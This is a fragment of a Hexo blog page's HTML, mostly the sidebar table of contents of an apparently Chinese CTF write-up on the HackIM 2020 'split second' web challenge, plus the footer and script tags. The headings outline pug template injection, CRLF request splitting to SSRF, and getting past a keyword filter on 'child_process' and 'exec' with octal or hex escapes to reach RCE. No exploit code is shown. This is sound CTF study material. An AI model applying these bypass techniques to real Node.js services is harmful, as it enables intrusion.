class="nav-number">1.2.5.2.</span> <span class="nav-text">pug模板注入示例：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.2.5.3.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于pug模板的相关知识可以参考如下链接："><span class="nav-number">1.2.5.4.</span> <span class="nav-text">对于pug模板的相关知识可以参考如下链接：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-pugjs-org-language-interpolation-html"><span class="nav-number">1.2.5.5.</span> <span class="nav-text">https://pugjs.org/language/interpolation.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过动态的调试我们可以看到代码的拼接过程："><span class="nav-number">1.2.5.6.</span> <span class="nav-text">通过动态的调试我们可以看到代码的拼接过程：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#到"><span class="nav-number">1.2.5.7.</span> <span class="nav-text">到:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的这段代码中的template函数就是通过Function来构造的，代码拼接进去的部分就是-u003C后面的console-log-quot-1-quot-和-u003E前面的console-log-quot-1-quot-，拼接了两个console-log-quot-1-quot-这就是，然后在函数运行的时候就会执行console-log-quot-1-quot-。"><span class="nav-number">1.2.5.8.</span> <span class="nav-text">上面的这段代码中的template函数就是通过Function来构造的，代码拼接进去的部分就是\u003C后面的console.log(&quot;1&quot;)和\u003E前面的console.log(&quot;1&quot;)，拼接了两个console.log(&quot;1&quot;)这就是，然后在函数运行的时候就会执行console.log(&quot;1&quot;)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到代码拼接进去了，结合上面两段代码简化一下就是："><span class="nav-number">1.2.5.9.</span> <span class="nav-text">我们可以看到代码拼接进去了，结合上面两段代码简化一下就是：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#request-splitting漏洞代码示例："><span class="nav-number">1.2.5.10.</span> <span class="nav-text">request splitting漏洞代码示例：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下：-1"><span class="nav-number">1.2.5.11.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由上面的结果可知我们已经成功实现了CRLF注入-上面的显示-为-7B-7D可能是我kali的问题-。"><span class="nav-number">1.2.5.12.</span> <span class="nav-text">由上面的结果可知我们已经成功实现了CRLF注入(上面的显示:为%7B %7D可能是我kali的问题)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来我们需要看那里调用了http-get导致SSRF。"><span class="nav-number">1.2.5.13.</span> <span class="nav-text">接下来我们需要看那里调用了http.get导致SSRF。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-core"><span class="nav-number">1.2.6.</span> <span class="nav-text">5./core</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里的q是我们可控的，而且这里使用了http-get来发起请求刚好满足我们上面的条件，但是构造的url中不能有-quot-global-quot-quot-process-quot-quot-mainModule-quot-quot-require-quot-quot-root-quot-quot-child-process-quot-quot-exec-quot-quot-quot-quot-quot-39-quot-quot-quot-字符串，我们可以对代码进行jsfuck加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用js的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如："><span class="nav-number">1.2.6.1.</span> <span class="nav-text">这里的q是我们可控的，而且这里使用了http.get来发起请求刚好满足我们上面的条件，但是构造的url中不能有[&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;]字符串，我们可以对代码进行jsfuck加密绕过，但是由于加密后的代码太大，请求量会很大，因此一般用js的匿名函数来绕过，且字母我们可以用8进制，16进制来代替，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#构造的脚本如下："><span class="nav-number">1.2.6.2.</span> <span class="nav-text">构造的脚本如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的原理相当于构造了个new-Function-quot-alert-1-quot-，由于Object的constructor是指向Function的，示例如下："><span class="nav-number">1.2.6.3.</span> <span class="nav-text">上面的原理相当于构造了个new Function(&quot;alert(1)&quot;)();，由于Object的constructor是指向Function的，示例如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。"><span class="nav-number">1.2.6.4.</span> <span class="nav-text">代码我们也梳理了一遍，现在我们来看看怎么rce拿到flag。</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-利用过程："><span class="nav-number">1.3.</span> <span class="nav-text">0x03 利用过程：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#solve-py"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">solve.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下：-2"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">结果如下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-总结"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">通过这次的学习，感觉自己还有好多的不足，因此自己还有好多需要去了解的，去学习的。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.4.1.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-xiaobye-ctf-CTF-writeups-blob-master-hackim-2020-web-split-20second-split-20second-md"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-wooyun-js-org-drops-E4-B8-80-E4-B8-AA-E5-8F-AF-E5-A4-A7-E8-A7-84-E6-A8-A1-E6-82-84-E6-97-A0-E5-A3-B0-E6-81-AF-E7-AA-83-E5-8F-96-E6-B7-98-E5-AE-9D-E6-94-AF-E4-BB-98-E5-AE-9D-E8-B4-A6-E5-8F-B7-E4-B8-8E-E5-AF-86-E7-A0-81-E7-9A-84-E6-BC-8F-E6-B4-9E-20-EF-BC-88-E5-9F-8B-E9-9B-B7-E5-BC-8F-E6-94-BB-E5-87-BB-E9-99-84-E5-B8-A6-E8-A7-86-E9-A2-91-E6-BC-94-E7-A4-BA-EF-BC-89-html"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">https://wooyun.js.org/drops/%E4%B8%80%E4%B8%AA%E5%8F%AF%E5%A4%A7%E8%A7%84%E6%A8%A1%E6%82%84%E6%97%A0%E5%A3%B0%E6%81%AF%E7%AA%83%E5%8F%96%E6%B7%98%E5%AE%9D.%E6%94%AF%E4%BB%98%E5%AE%9D%E8%B4%A6%E5%8F%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%20-%EF%BC%88%E5%9F%8B%E9%9B%B7%E5%BC%8F%E6%94%BB%E5%87%BB%E9%99%84%E5%B8%A6%E8%A7%86%E9%A2%91%E6%BC%94%E7%A4%BA%EF%BC%89.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-mengsec-com-2019-06-14-alert1-to-win"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">https://mengsec.com/2019/06/14/alert1-to-win/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-rfk-id-au-blog-entry-security-bugs-ssrf-via-request-splitting"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-zhuanlan-zhihu-com-p-28823933"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">https://zhuanlan.zhihu.com/p/28823933</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-tipi-hack-github-io-2019-04-14-breizh-jail-calc2-html"><span class="nav-number">1.4.1.6.</span> <span class="nav-text">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">171.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
